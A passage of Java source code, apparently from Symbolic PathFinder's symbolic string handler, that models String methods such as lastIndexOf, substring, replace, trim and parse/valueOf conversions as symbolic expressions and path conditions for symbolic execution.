					ElementInfo e1 = th.getElementInfo(s2);
					String val = e1.asString();
					assert(sym_v2!=null);
					result = new StringConstant(val)._lastIndexOf(sym_v2);
					
				}
			
			sf.push(0, false);
			assert result != null;
			sf.setOperandAttr(result);

		}
	}

	public void handleLastIndexOf2(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();

		StringExpression sym_v1 = null;
		StringExpression sym_v2 = null;
		IntegerExpression intExp = null;
		sym_v1 = (StringExpression) sf.getOperandAttr(2);
		intExp = (IntegerExpression) sf.getOperandAttr(0);
		sym_v2 = (StringExpression) sf.getOperandAttr(1);

		if (sym_v1 == null && sym_v2 == null && intExp == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleLastIndexOf2"");
		} else {
			int i1 = sf.pop();
			boolean s2char = true;
			if (th.getModifiableTopFrame().isOperandRef()) {
				s2char = false;
			}
			
			int s2 = sf.pop();
			int s1 = sf.pop();

			IntegerExpression result = null;
			if (intExp != null) {
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						result = sym_v1._lastIndexOf(sym_v2, intExp);
					} else {
						if (s2char) {
							result = sym_v1._lastIndexOf(new IntegerConstant(s2), intExp);
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._lastIndexOf(new StringConstant(val), intExp);
						}
					}
				} else { //sym_v1 is null
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();

					if (sym_v2 != null) { 
						result = new StringConstant(val)._lastIndexOf(sym_v2, intExp);
					} else {
						if (s2char) {
							result = new StringConstant(val)._lastIndexOf(new IntegerConstant(s2), intExp);
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val2 = e2.asString();
							result = new StringConstant(val)._lastIndexOf(new StringConstant(val2), intExp);
						}
					}
				}
			}
			else { // intExp is null
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						result = sym_v1._lastIndexOf(sym_v2, new IntegerConstant(i1));
					} else {
						if (s2char) {
							result = sym_v1._lastIndexOf(new IntegerConstant(s2), new IntegerConstant(i1));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._lastIndexOf(new StringConstant(val), new IntegerConstant(i1));
							//System.out.println(""[handleIndexOf2] Special push"");
							//Special push?
							//th.push(s1, true);
						}
					}
				} else { // sym_v1 is null
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();
					assert(sym_v2!=null);
					result = new StringConstant(val)._lastIndexOf(sym_v2, new IntegerConstant(i1));
				}
			}
			
			sf.push(0, false);
			assert result != null;
			sf.setOperandAttr(result);

		}
	}


	

	public void handlebooleanValue(JVMInvokeInstruction invInst, SystemState ss, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandlebooleanValue"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				sf.push(0, false);
				sf.setOperandAttr(sym_v2);
			} else {
				throw new RuntimeException(""ERROR: operand type not tackled - booleanValue"");
			}

		}

	}

	public void handleintValue(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleintValue"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				sf.push(0, false);
				sf.setOperandAttr(sym_v2);
			} else {
				th.printStackTrace();
				throw new RuntimeException(""ERROR: operand type not tackled - intValue"");
			}
		}
	}

	public void handlelongValue(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: hanldeLongValue"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				sf.pushLong((long) 0);
				sf.setLongOperandAttr(sym_v2);
			} else {
				throw new RuntimeException(""ERROR: operand type not tackled - longValue"");
			}

		}

	}

	public void handlefloatValue(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand: hanldeFloatValue"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				RealExpression sym_v2 = (RealExpression) sym_v3;
				sf.pop();
				sf.push(0, false);
				sf.setOperandAttr(sym_v2);
			} else {
				throw new RuntimeException(""ERROR: operand type not tackled - floatValue"");
			}

		}

	}

	public void handledoubleValue(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand: hanldeDoubleValue"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				RealExpression sym_v2 = (RealExpression) sym_v3;
				sf.pop();
				sf.pushLong((long) 0);
				sf.setLongOperandAttr(sym_v2);
			} else {
				throw new RuntimeException(""ERROR: operand type not tackled - doubleValue"");
			}

		}

	}

	/*
	 * StringBuilder or StringBuffer or BigDecimal initiation with symbolic
	 * primitives
	 */

	public Instruction handleInit(JVMInvokeInstruction invInst,  ThreadInfo th) {

		String cname = invInst.getInvokedMethodClassName();
		if (cname.equals(""java.lang.StringBuilder"") || cname.equals(""java.lang.StringBuffer"")) {
			StackFrame sf = th.getModifiableTopFrame();
			StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
			SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);
			if (sym_v1 == null) {
				throw new RuntimeException(""ERROR: symbolic StringBuilder method must have one symbolic operand in Init"");
			} else {
				sf.pop(); /* string object */
				sf.pop(); /* one stringBuilder Object */
				sym_v2.putstr(sym_v1);
				sf.setOperandAttr(sym_v2);
				return invInst.getNext();
			}
		} else {
			// Corina TODO: we should allow symbolic string analysis to kick in only when desired
			//throw new RuntimeException(""Warning Symbolic String Analysis: Initialization type not handled in symbc/bytecode/SymbolicStringHandler init"");
			return null;
		}
	}

	/***************************** Symbolic Big Decimal Routines end ****************/


	private void handleBooleanStringInstructions(JVMInvokeInstruction invInst,  ThreadInfo th, StringComparator comp) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);

		if ((sym_v1 == null) & (sym_v2 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleStartsWith"");
		} else {
			ChoiceGenerator<?> cg;
			boolean conditionValue;

			cg = th.getVM().getChoiceGenerator();
			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

			// System.out.println(""conditionValue: "" + conditionValue);

			int s1 = sf.pop();
			int s2 = sf.pop();
			PathCondition pc;

			// pc is updated with the pc stored in the choice generator above
			// get the path condition from the
			// previous choice generator of the same type

			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null) {
				pc = new PathCondition();
			} else {
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();
			}

			assert pc != null;

			if (conditionValue) {
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						pc.spc._addDet(comp, sym_v1, sym_v2);
					} else {
						ElementInfo e2 = th.getElementInfo(s2);
						String val = e2.asString();
						pc.spc._addDet(comp, sym_v1, val);
					}
				} else {
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();
					pc.spc._addDet(comp, val, sym_v2);
				}
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					// pc.solve();
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					// System.out.println(((PCChoiceGenerator) cg).getCurrentPC());
				}
			} else {
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						pc.spc._addDet(comp.not(), sym_v1, sym_v2);
					} else {
						ElementInfo e2 = th.getElementInfo(s2);
						String val = e2.asString();
						pc.spc._addDet(comp.not(), sym_v1, val);

					}
				} else {
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();
					pc.spc._addDet(comp.not(), val, sym_v2);
				}
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
				}
			}

			sf.push(conditionValue ? 1 : 0, true);

		}

	}

	public void handleEqualsIgnoreCase(JVMInvokeInstruction invInst,  ThreadInfo th) {
		throw new RuntimeException(""ERROR: symbolic string method not Implemented - EqualsIgnoreCase"");
	}

	public void handleEndsWith(JVMInvokeInstruction invInst,  ThreadInfo th) {
		//throw new RuntimeException(""ERROR: symbolic string method not Implemented - EndsWith"");
		handleBooleanStringInstructions(invInst,  th, StringComparator.ENDSWITH);
	}

	public void handleContains (JVMInvokeInstruction invInst,  ThreadInfo th) {
		handleBooleanStringInstructions(invInst,  th, StringComparator.CONTAINS);
	}


	public void handleStartsWith(JVMInvokeInstruction invInst,  ThreadInfo th) {
		//throw new RuntimeException(""ERROR: symbolic string method not Implemented - StartsWith"");
		handleBooleanStringInstructions(invInst, th, StringComparator.STARTSWITH);
	}

	//Only supports character for character
	public Instruction handleReplace(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);
		StringExpression sym_v3 = (StringExpression) sf.getOperandAttr(2);

		if ((sym_v1 == null) & (sym_v2 == null) & (sym_v3 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleReplace"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();
			int s3 = sf.pop();
			//System.out.println(""[handleReplace] "" + s1 + "" "" + s2 + "" "" + s3);
			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				//ElementInfo e1 = th.getElementInfo(s1);
				String val = String.valueOf((char) s1);
				if (sym_v2 == null) { // sym_v3 has to be symbolic
					//ElementInfo e2 = th.getElementInfo(s2);
					//String val1 = e2.asString();
					result = sym_v3._replace(val, String.valueOf((char)s2));
				} else {
					if (sym_v3 == null) { // only sym_v2 is symbolic
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replace(val, sym_v2);
					} else {
						result = sym_v3._replace(val, sym_v2);
					}
				}
			} else { // sym_v1 is symbolic
				if (sym_v2 == null) {
					if (sym_v3 == null) {
						//ElementInfo e2 = th.getElementInfo(s2);
						String val1 = String.valueOf((char) s2);
						//ElementInfo e3 = th.getElementInfo(s3);
						String val2 = String.valueOf((char) s3);
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replace(sym_v1, val1);
					} else {
						//ElementInfo e2 = th.getElementInfo(s2);
						String val1 = String.valueOf((char) s2);
						result = sym_v3._replace(sym_v1, val1);
					}
				} else {
					if (sym_v3 == null) {
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replace(sym_v1, sym_v2);
					} else {
						result = sym_v3._replace(sym_v1, sym_v2);
					}
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef.getObjectRef(), true);
			sf.setOperandAttr(result);
		}
		return null;
	}

	public Instruction handleSubString(JVMInvokeInstruction invInst, ThreadInfo th) {
		int numStackSlots = invInst.getArgSize();
		if (numStackSlots == 2) {
			return handleSubString1(invInst, th);
		} else {
			return handleSubString2(invInst, th);
		}
	}

	public Instruction handleSubString1(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);

		if ((sym_v1 == null) & (sym_v2 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleSubString1"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();

			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				int val = s1;
				result = sym_v2._subString(val);
			} else {
				if (sym_v2 == null) {
					ElementInfo e1 = th.getElementInfo(s2);
					String val2 = e1.asString();
					sym_v2 = new StringConstant(val2);
					result = sym_v2._subString(sym_v1);
				} else {
					result = sym_v2._subString(sym_v1);
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef.getObjectRef(), true);
			sf.setOperandAttr(result);
		}
		return null;
	}

	public Instruction handleSubString2(JVMInvokeInstruction invInst, ThreadInfo th) {
		//System.out.println(""[SymbolicStringHandler] doing"");
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		IntegerExpression sym_v2 = (IntegerExpression) sf.getOperandAttr(1);
		StringExpression sym_v3 = (StringExpression) sf.getOperandAttr(2);

		if ((sym_v1 == null) & (sym_v2 == null) & (sym_v3 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleSubString2"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();
			int s3 = sf.pop();
			//System.out.printf(""[SymbolicStringHandler] popped %d %d %d\n"", s1, s2, s3);
			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				int val = s1;
				if (sym_v2 == null) { // sym_v3 has to be symbolic
					int val1 = s2;
					result = sym_v3._subString(val, val1);
					//System.out.println(""[SymbolicStringHandler] special push"");
					/* Only if both arguments are concrete, something else needs
					 * to be pushed?
					 */
					//sf.push(s3, true); /* symbolic string element */
				} else {
					if (sym_v3 == null) { // only sym_v2 is symbolic
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._subString(val, sym_v2);
					} else {
						result = sym_v3._subString(val, sym_v2);
					}
				}
			} else { // sym_v1 is symbolic
				if (sym_v2 == null) {
					if (sym_v3 == null) {
						int val1 = s2;
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._subString(sym_v1, val1);
					} else {
						int val1 = s2;
						result = sym_v3._subString(sym_v1, val1);
					}
				} else {
					if (sym_v3 == null) {
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._subString(sym_v1, sym_v2);
					} else {
						result = sym_v3._subString(sym_v1, sym_v2);
					}
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th);
			//System.out.println(""[SymbolicStringHandler] "" + sf.toString());
			sf.push(objRef.getObjectRef(), true);
			//System.out.println(""[SymbolicStringHandler] "" + sf.toString());
			sf.setOperandAttr(result);
		}

		return null;
	}

	public Instruction handleReplaceFirst(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);
		StringExpression sym_v3 = (StringExpression) sf.getOperandAttr(2);

		if ((sym_v1 == null) & (sym_v2 == null) & (sym_v3 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HanldeReplaceFirst"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();
			int s3 = sf.pop();

			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				ElementInfo e1 = th.getElementInfo(s1);
				String val = e1.asString();
				if (sym_v2 == null) { // sym_v3 has to be symbolic
					ElementInfo e2 = th.getElementInfo(s2);
					String val1 = e2.asString();
					result = sym_v3._replaceFirst(val, val1);

				} else {
					if (sym_v3 == null) { // only sym_v2 is symbolic
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replaceFirst(val, sym_v2);
					} else {
						result = sym_v3._replaceFirst(val, sym_v2);
					}
				}
			} else { // sym_v1 is symbolic
				if (sym_v2 == null) {
					if (sym_v3 == null) {
						ElementInfo e2 = th.getElementInfo(s2);
						String val1 = e2.asString();
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replaceFirst(sym_v1, val1);
					} else {
						ElementInfo e2 = th.getElementInfo(s2);
						String val1 = e2.asString();
						result = sym_v3._replaceFirst(sym_v1, val1);
					}
				} else {
					if (sym_v3 == null) {
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replaceFirst(sym_v1, sym_v2);
					} else {
						result = sym_v3._replaceFirst(sym_v1, sym_v2);
					}
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef.getObjectRef(), true);
			sf.setOperandAttr(result);
		}
		return null;
	}

	public void handleTrim(JVMInvokeInstruction invInst, ThreadInfo th) {
		// throw new RuntimeException(""ERROR: symbolic string method not Implemented - Trim"");
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		int s1 = sf.pop();

		if (sym_v1 == null) {
			ElementInfo e1 = th.getElementInfo(s1);
			String val1 = e1.asString();
			sym_v1 = new StringConstant(val1);
		}
		StringExpression result = sym_v1._trim();

		ElementInfo  objRef = th.getHeap().newString("""", th); /*
																																 * dummy String
																																 * Object
																																 */
		sf.push(objRef.getObjectRef(), true);
		sf.setOperandAttr(result);
	}

	public Instruction handleValueOf(JVMInvokeInstruction invInst,  ThreadInfo th) {
		MethodInfo mi = invInst.getInvokedMethod(th);
		String cname = invInst.getInvokedMethodClassName();
		String[] argTypes = mi.getArgumentTypeNames();
		if (cname.equals(""java.lang.String"")) {
			// System.out.println(argTypes[0]);
			if (argTypes[0].equals(""int"")) {
				return handleIntValueOf(invInst,  th);
			} else if (argTypes[0].equals(""float"")) {
				return handleFloatValueOf(invInst, th);
			} else if (argTypes[0].equals(""long"")) {
				return handleLongValueOf(invInst, th);
			} else if (argTypes[0].equals(""double"")) {
				return handleDoubleValueOf(invInst, th);
			} else if (argTypes[0].equals(""char"")) {
				return handleCharValueOf(invInst, th);
			} else if (argTypes[0].equals(""chararray"")) {
				return handleCharArrayValueOf(invInst, th);
			} else if (argTypes[0].equals(""boolean"")) {
				return handleBooleanValueOf(invInst, th);
			} else if (argTypes[0].equals(""java.lang.Object"")) {
				return handleObjectValueOf(invInst, th);
			} else {
				throw new RuntimeException(""ERROR: Input parameter type not handled in Symbolic String ValueOf"");
			}
		} else { // value of non-string types
			if (cname.equals(""java.lang.Integer"")) {
				if (!(argTypes[0].equals(""int""))) { // converting String to Integer
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseIntValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseIntValueOf(invInst,  th);
				}
			} else if (cname.equals(""java.lang.Float"")) {
				if (!(argTypes[0].equals(""float""))) { // converting String to Float
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseFloatValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseFloatValueOf(invInst, th);
				}
			} else if (cname.equals(""java.lang.Long"")) {
				if (!(argTypes[0].equals(""long""))) { // converting String to Long
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseLongValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseLongValueOf(invInst, th);
				}
			} else if (cname.equals(""java.lang.Double"")) {
				if (!(argTypes[0].equals(""double""))) { // converting String to Double
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().getSystemState().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseDoubleValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseLongValueOf(invInst, th);
				}
			} else if (cname.equals(""java.lang.Boolean"")) {
				if (!(argTypes[0].equals(""boolean""))) { // converting String to Boolean
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseBooleanValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseBooleanValueOf(invInst, th);
				}
			} else {
				throw new RuntimeException(""ERROR: Type not handled in Symbolic Type ValueOf: "" + cname);
			}
		}
		return null;
	}
	public void handleIsEmpty(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleIsEmpty"");
		} else {
			IntegerExpression sym_v2 = sym_v1._length();
			ChoiceGenerator<?> cg;
			boolean conditionValue;
			cg = th.getVM().getChoiceGenerator();

			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

			sf.pop();
			PathCondition pc;

			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null) {
				pc = new PathCondition();
			} else {
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();
			}

			assert pc != null;

			if(conditionValue){
				pc._addDet(Comparator.EQ, sym_v2, (IntegerExpression)(new IntegerConstant(0)));
				if(!pc.simplify()) {
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
				}
			}else{
				pc._addDet(Comparator.NE, sym_v2, (IntegerExpression)(new IntegerConstant(0)));
				if(!pc.simplify()) {
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
				}
			}

			sf.push(conditionValue ? 1 : 0, true);
		}
	}

	public void handleParseLongValueOf(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.popLong();
				int objRef = getNewObjRef(invInst, th); /* dummy Long Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				IntegerExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISLONG, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._IvalueOf();
						sf = th.getModifiableTopFrame();
						int objRef = getNewObjRef(invInst, th); /* dummy Long Object */
						sf.push(objRef, true);
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTLONG, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Long Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true); TODO: needs revision
						//sf.push(0, true);
					}
				}
			}
		}
	}

	public void handleParseBooleanValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				int objRef = getNewObjRef(invInst, th); /* dummy Boolean Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				IntegerExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISBOOLEAN, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._IvalueOf();
						sf = th.getModifiableTopFrame();
						int objRef = getNewObjRef(invInst, th); /* dummy Boolean Object */
						sf.push(objRef, true);
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTBOOLEAN, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Boolean Format Type Exception""); 
						// TODO: to review; there should be no backtracking here
						//th.getVM().getSystemState().setIgnored(true);
						//sf.push(0, true);
					}
				}
			}
		}
	}

	public void handleParseIntValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				int objRef = getNewObjRef(invInst, th); /* dummy Integer Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				IntegerExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISINTEGER, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._IvalueOf();
						sf = th.getModifiableTopFrame();
						int objRef = getNewObjRef(invInst, th); /* dummy Integer Object */
						sf.push(objRef, true);
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTINTEGER, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Integer Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
						//sf.push(0, true);
					}
				}
			}
		}
	}

	public void handleParseInt(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

